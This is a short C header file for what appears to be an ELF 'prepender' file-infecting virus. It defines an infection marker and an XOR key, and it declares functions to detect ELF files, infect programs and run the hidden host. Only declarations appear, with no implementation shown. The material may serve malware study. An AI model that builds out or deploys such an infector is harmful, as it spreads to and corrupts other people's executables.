#ifndef __PREPENDER_H
#define __PREPENDER_H "prepender.h"

#include <stdbool.h>

// Macros
#define bota(x) ((x)?"true":"false")
#define len(arr) (sizeof(arr)/sizeof(arr[0]))


#define __MAGIC (const unsigned char[]) {0x7F, 'E', 'L', 'F'}
#define __INFECTION_MARK (const unsigned char[]) {'^', 'F', 'K', 'D', '^'}
#define __XOR_KEY "SomeXORKey"

typedef unsigned char byte;

bool is_elf(char*);
bool is_infected(char*);
byte* read_file(char*);
char* xor_enc_dec(const char*);
unsigned int file_size(char*);

void infect_program(const char*, const char*);
void run_infected_host(const char*, const char*);

#endif
